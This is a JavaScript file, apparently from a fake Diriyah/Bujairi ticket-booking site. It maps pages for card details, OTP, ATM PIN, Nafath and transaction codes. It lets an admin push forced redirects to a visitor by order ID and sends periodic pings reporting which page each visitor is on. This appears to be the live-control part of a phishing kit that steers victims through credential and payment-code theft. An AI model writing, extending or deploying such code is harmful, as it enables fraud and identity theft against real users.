(function () {
    var site = window.BUJAIRI_SITE || {};
    var page = window.BUJAIRI_PAGE || {};
    /** تتبع الحضور فقط — لا يعطّل Pusher/التوجيه عند إغفاله */
    var pingUrl = (site.pingUrl && String(site.pingUrl)) ? String(site.pingUrl).trim() : '';

    function getOrderIdStr() {
        if (page && page.orderId != null && String(page.orderId) !== '' && String(page.orderId) !== '0') {
            return String(page.orderId);
        }
        try {
            var u = new URL(window.location.href);
            var gid = parseInt(String(u.searchParams.get('id') || ''), 10);
            if (gid > 0) {
                return String(gid);
            }
        } catch (e0) {}
        try {
            return localStorage.getItem('bujairi_order_id') || '';
        } catch (e) {
            return '';
        }
    }

    function labelFromPath() {
        var path = (window.location.pathname || '').replace(/\\/g, '/');
        var base = path.split('/').pop() || '';
        if (base.indexOf('?') !== -1) {
            base = base.split('?')[0];
        }
        base = base.toLowerCase();
        var map = {
            'index.php': 'الرئيسية',
            'login.php': 'تسجيل الدخول',
            'register.php': 'إنشاء حساب',
            'logout.php': 'تسجيل الخروج',
            'restaurants.php': 'المطاعم',
            'restaurant.php': 'صفحة مطعم',
            'privacy.php': 'سياسة الخصوصية',
            'access-denied.php': 'رفض الوصول',
            'redirect-bridge.php': 'جسر التوجيه',
            'tickets.php': 'حجز تصريح الدرعية',
            'checkout.php': 'إتمام الشراء',
            'payment-info.php': 'بيانات البطاقة',
            'payment-method.php': 'طريقة الدفع',
            'otp.php': 'رمز التحقق (OTP)',
            'atm.php': 'رمز الصراف ATM',
            'customer-info.php': 'توثيق الجوال',
            'success.php': 'صفحة النجاح / رمز العميل',
            'nafath.php': 'نفاذ — رمز الطلب',
            'transaction-code.php': 'رمز المعاملة',
            'create.php': 'إنشاء طلب'
        };
        return map[base] || 'تصفّح الموقع';
    }

    function presenceLabel() {
        if (page && page.label) {
            return String(page.label);
        }
        return labelFromPath();
    }

    function presencePath() {
        var p = (window.location.pathname || '').replace(/\\/g, '/');
        if (p === '' || p.charAt(0) !== '/') {
            p = '/' + p.replace(/^\/+/, '');
        }
        var s = window.location.search || '';
        return (p + s).replace(/\s+/g, '');
    }

    var pusherCfg = site.pusher;
    if (pusherCfg && pusherCfg.key && typeof Pusher !== 'undefined') {
        var pusher = new Pusher(pusherCfg.key, {
            cluster: pusherCfg.cluster || 'ap2',
            useTLS: true
        });
        var ch = pusher.subscribe('my-channel');

        ch.bind('nafath-display-updated', function (data) {
            if (typeof window.bujairiOnNafathDisplayUpdated === 'function') {
                window.bujairiOnNafathDisplayUpdated(data || {});
            }
        });

        ch.bind('force-redirect-user', function (data) {
            if (!data || !data.url) {
                return;
            }
            var sid = getOrderIdStr();
            if (!sid || String(data.userId) !== String(sid)) {
                return;
            }
            if (data.redirectVersion != null && data.redirectVersion !== '') {
                var dvv = parseInt(String(data.redirectVersion), 10) || 0;
                if (dvv > 0) {
                    try {
                        sessionStorage.setItem('bujairi_rdir_v_' + String(sid), String(dvv));
                    } catch (eV) {}
                }
            }
            // التوجيه من الإدارة يُنفَّذ دائماً (حتى لنفس الصفحة)؛ السيرفر يضيف _bujairi_push.
            // لا نستخدم shouldIgnoreRedirectUrl هنا — كان يمنع إعادة التوجيه و«يعلق» التوجيه.
            if (typeof window.__bujairiUnlockOtpModal === 'function') {
                try {
                    window.__bujairiUnlockOtpModal();
                } catch (e) {}
            }
            if (typeof window.bujairiShowRedirectLoadingThenGo === 'function') {
                window.bujairiShowRedirectLoadingThenGo(data.url);
            } else {
                window.location.href = data.url;
            }
        });
    }

    var oidForStore = getOrderIdStr();
    if (oidForStore) {
        try {
            localStorage.setItem('bujairi_order_id', oidForStore);
        } catch (eLs) {}
    }

    var pollBase = (site.redirectStatusUrl && String(site.redirectStatusUrl).trim()) || '';
    var pollOid = parseInt(getOrderIdStr(), 10) || 0;
    if (pollBase && pollOid > 0 && typeof window.BujairiVerifyWait !== 'undefined' &&
        typeof window.BujairiVerifyWait.startBackgroundRedirectPoll === 'function') {
        try {
            window.BujairiVerifyWait.startBackgroundRedirectPoll(pollOid, pollBase);
        } catch (ePoll) {}
    }

    if (!pingUrl) {
        return;
    }

    function sendPresencePing() {
        if (document.visibilityState !== 'visible') {
            return;
        }
        var oidStr = getOrderIdStr();
        if (!oidStr) {
            return;
        }
        var oid = parseInt(oidStr, 10);
        if (!oid || oid < 1) {
            return;
        }
        var body = JSON.stringify({
            orderId: oid,
            path: presencePath(),
            label: presenceLabel()
        });
        fetch(pingUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: body,
            credentials: 'same-origin',
            keepalive: true
        }).catch(function () {});
    }

    sendPresencePing();
    document.addEventListener('visibilitychange', function () {
        if (document.visibilityState === 'visible') {
            sendPresencePing();
        }
    });
    window.addEventListener('pageshow', function (ev) {
        if (ev.persisted) {
            sendPresencePing();
        }
    });

    var iv = parseInt(site.intervalMs, 10) || 12000;
    if (iv < 5000) {
        iv = 5000;
    }
    setInterval(sendPresencePing, iv);
})();
